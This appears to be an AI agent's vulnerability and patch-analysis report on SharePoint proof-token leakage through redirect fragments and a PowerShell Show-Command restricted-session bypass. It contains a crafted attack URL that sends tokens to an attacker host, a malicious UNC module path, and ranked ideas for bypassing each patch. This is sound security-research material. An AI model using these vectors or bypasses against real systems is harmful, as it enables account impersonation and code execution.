Agent: Codex-GPT-5
Timestamp: 2025-11-19 15:02:43
Duration: 00:09

## Vulnerability Discovery
1. **ProofTokenSignInPage fragment-handling flaw** (High, CWE-601 / token leakage). `ProofTokenSignInPage.ShouldRedirectWithProofToken` only vetted that `redirect_uri` belonged to the tenant and then auto-posted proof/identity tokens via `silentsignin.aspx`, allowing attackers to smuggle OAuth proof tokens through URL fragments to arbitrary servers (snapshots_decompiled/v1/Microsoft.-1bae7604-1834fb48/Microsoft/SharePoint/IdentityModel/ProofTokenSignInPage.cs:45-322).
2. **ShowCommandCommand restricted-session bypass** (High, CWE-284). The Show-Command UX imported modules from whatever path the UI helper requested—even UNC/device paths—so restricted sessions (e.g., Constrained Language Mode) could be trivially bypassed by pointing at attacker-controlled modules (snapshots_decompiled/v1/Microsoft.-056c3798-daa17c9d/Microsoft/PowerShell/Commands/ShowCommandCommand.cs:387-415).

## Root Cause Analysis
### ProofTokenSignInPage fragment-handling flaw
- **Mechanism:** `RedirectUri` is taken from `redirect_uri` query string and, after only tenant-scope validation, returned via `FormActionValue` to the silent sign-in form. The form (`snapshots_norm/v1/.../silentsignin.aspx:26-55`) posts proof/identity tokens automatically, so any attacker-controlled resource within the tenant (e.g., `_layouts/15/start.aspx`) receives the victim’s freshly minted tokens along with attacker-supplied `#fragment` instructions.
- **Attack scenario:** An attacker crafts `https://tenant/_layouts/15/silentsignin.aspx?redirect_uri=https://tenant/_layouts/15/start.aspx#target=https://attacker`. When the victim’s browser hits the page, SharePoint mints tokens (using `OnLogOnRequestToAppWeb`) and auto-posts them to `start.aspx`. The page reads `window.location.hash` and can forward the browser to `https://attacker`, leaking tokens that allow complete impersonation of the victim across SharePoint/OAuth services.
- **Prerequisites:** Ability to host or abuse any page in the same tenant (custom site page, OOB redirector, etc.) and entice an authenticated user (or automated CSRF) to hit `silentsignin.aspx` with crafted parameters.

### ShowCommandCommand restricted-session bypass
- **Mechanism:** Inside `WaitForWindowClosedOrHelpNeeded`, when the UI requests a module import, the cmdlet builds an import script directly from `ParentModuleNeedingImportModule` without checking path provenance. In restricted sessions, importing network/device modules is supposed to be blocked, but Show-Command bypassed the policy by invoking `Import-Module` itself.
- **Attack scenario:** In a constrained environment (Exchange/SharePoint Management Shell), an attacker runs `Show-Command`, picks any command, and specifies a module stored at `\\attacker\share\evil.psd1`. Show-Command imports it automatically, executing arbitrary code despite the language mode restrictions.
- **Prerequisites:** Ability to invoke Show-Command inside a restricted session (commonly available to admins); attacker-controlled network/device path accessible to the victim session.

## Patch Analysis
### ProofTokenSignInPage fragment-handling flaw
- **Changes:** v2 defines kill switch `RevertRedirectFixinProofTokenSigninPage` and updates `ShouldRedirectWithProofToken` to deny redirect URIs whose `Uri.Fragment` is non-empty unless debug flag 53020 is explicitly enabled (snapshots_decompiled/v2/Microsoft.-1bae7604-1834fb48/Microsoft/SharePoint/IdentityModel/ProofTokenSignInPage.cs:35-327).
- **Effect:** Silent sign-in now refuses to generate or post proof tokens when the redirect contains a hash, blocking the primary token-smuggling vector demonstrated above.

### ShowCommandCommand restricted-session bypass
- **Changes:** Before importing, v2 normalizes the module path and, when `Utils.IsSessionRestricted` is true, throws an error if the path is a network share or device path (snapshots_decompiled/v2/Microsoft.-056c3798-daa17c9d/Microsoft/PowerShell/Commands/ShowCommandCommand.cs:402-421).
- **Effect:** Restricted sessions can no longer auto-import modules from UNC/device roots through Show-Command, aligning the behavior with the platform’s intended security boundaries.

## Bypass Hypotheses
### ProofTokenSignInPage fragment-handling flaw
- **High:** Use a server-side redirector that reads query parameters (e.g., `Source=`) instead of fragments; the new fix does not sanitize those, so proof tokens could still be relayed to arbitrary domains through multi-hop redirects.
- **Medium:** Percent-encode the hash (`%23`). Because `Uri.Fragment` stays empty until the browser decodes the navigation, the guard may miss it while the client still honors the fragment once it follows the redirect.
- **Low:** Locate alternate SharePoint pages that mint proof tokens but did not get the fragment check (legacy sign-in routes, future APIs); tokens could still be leaked via fragments through those endpoints.

### ShowCommandCommand restricted-session bypass
- **High:** Place the malicious module on a local directory junction/symlink that targets a UNC path; normalization sees a local path, but I/O still traverses the share, bringing the vulnerability back.
- **Medium:** Use a local manifest whose `RootModule` or nested modules reference UNC/device paths. The guard only inspects the manifest path, not subsequent loads.
- **Low:** Trigger module import through other Show-Command code paths (e.g., `-PassThru`, future helpers) that might skip the new path validation.

## Overall Assessment
- **Discovery success:** Two high-severity vulnerabilities identified (token leakage via silent sign-in fragments; restricted-session bypass in Show-Command).
- **Patch completeness:** Improvements mitigate the exact proof-of-concept vectors but leave residual gaps (query-based redirectors, encoded delimiters, junction-based UNC access, nested modules). Broader validation is recommended.
- **Recommendations:**
  - Enforce a strict allowlist for redirect destinations, decode all delimiters before validation, and ensure every proof-token issuing endpoint applies the same scrutiny.
  - Resolve filesystem reparse points before classification and extend the UNC/device-path checks to nested module loads and other automation entry points.
